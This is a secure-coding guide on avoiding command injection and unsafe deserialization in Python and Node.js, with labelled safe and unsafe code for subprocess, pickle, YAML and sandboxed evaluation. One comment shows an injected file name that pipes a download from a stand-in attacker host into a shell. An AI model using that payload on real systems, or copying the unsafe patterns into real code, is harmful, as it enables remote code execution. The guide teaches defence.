# Command injection and unsafe deserialization

Two distinct patterns lead to arbitrary code execution in application code: passing
user-controlled data to a shell, and deserializing objects from untrusted sources. The [RCE attack perspective](https://red.tymyrddin.dev/docs/in/app/techniques/rce.html) covers what remote code execution looks like from the other side, and the [insecure deserialisation page](https://red.tymyrddin.dev/docs/in/app/techniques/id.html) covers the deserialization attack surface in depth.

## Command injection

The problem is not that an application runs external commands. It is how the command is
constructed.

### Python

`subprocess.run()` with a list does not invoke a shell. Each list element is a separate
argument, so shell metacharacters (`; | && > $()`) in user input are treated as literal
strings:

```python
import subprocess

# safe: list form, no shell
def convert_image(input_path: str, output_path: str) -> None:
    subprocess.run(
        ["convert", input_path, output_path],
        check=True,
        capture_output=True,
    )
```

The unsafe alternative for comparison:

```python
# unsafe: shell=True passes the string to /bin/sh
def convert_image_unsafe(input_path: str, output_path: str) -> None:
    subprocess.run(f"convert {input_path} {output_path}", shell=True)
    # input_path = "x; curl attacker.com | sh"
```

`os.system()` and `os.popen()` always invoke a shell. Both are in the same category.

When a shell is genuinely required (for pipes, shell built-ins, or glob expansion), use
`shlex.quote()` on each user-controlled value before interpolating it into the command string:

```python
import shlex, subprocess

def grep_log(pattern: str, logfile: str) -> str:
    cmd = f"grep {shlex.quote(pattern)} {shlex.quote(logfile)}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout
```

Prefer the list form where possible.

### Node.js

`child_process.execFile()` takes a command and arguments separately and does not invoke a
shell:

```javascript
const { execFile } = require("child_process");
const { promisify } = require("util");
const execFileAsync = promisify(execFile);

async function convertImage(inputPath, outputPath) {
    // safe: execFile does not invoke a shell
    await execFileAsync("convert", [inputPath, outputPath]);
}
```

`exec()` and `execSync()` pass a string to the shell. `spawn()` with `shell: false`
(the default) is the low-level equivalent of `execFile()`.

## Unsafe deserialization

### Python pickle

Python's `pickle` module can execute arbitrary code during deserialization. Any pickle data
from outside the application is a code execution vector:

```python
import pickle

# unsafe: loading attacker-controlled bytes
def load_session(data: bytes):
    return pickle.loads(data)  # attacker can run arbitrary code here
```

Use JSON for data that crosses trust boundaries. JSON carries no executable semantics:

```python
import json

def load_session(data: str) -> dict:
    return json.loads(data)
```

When structured Python objects are genuinely needed across a trust boundary, use a schema
library (Pydantic, marshmallow, attrs) to deserialize from JSON into validated objects.

### YAML

PyYAML's `yaml.load()` with the default Loader executes arbitrary Python when it encounters
certain YAML constructs. `yaml.safe_load()` restricts parsing to scalar types and
collections:

```python
import yaml

# unsafe: executes Python via !!python/object tags
data = yaml.load(user_input)

# safe: restricted parser, no code execution
data = yaml.safe_load(user_input)
```

Since PyYAML 6.0 `yaml.load()` without an explicit Loader raises a warning. Passing
`Loader=yaml.FullLoader` is not sufficient for untrusted input; `SafeLoader` is the
appropriate choice for data from outside the application.

## Sandboxed evaluation

When the application requires evaluating user-supplied expressions (calculator, formula
engine, template language), a purpose-built library is safer than a general-purpose
interpreter:

* Python: `ast.literal_eval()` evaluates Python literals only (strings, numbers, lists,
  dicts, tuples, booleans, None). It does not execute function calls or imports.
* JavaScript: `isolated-vm` provides a V8 isolate with explicit memory and CPU limits.
  `vm2` is an alternative though it has had historical escapes; `isolated-vm` is the more
  hardened option.

Both approaches have limits. A formula language with access to arbitrary numeric operations
can still cause denial of service through resource exhaustion; set explicit timeouts and
memory caps.
Last updated: 10 July 2026
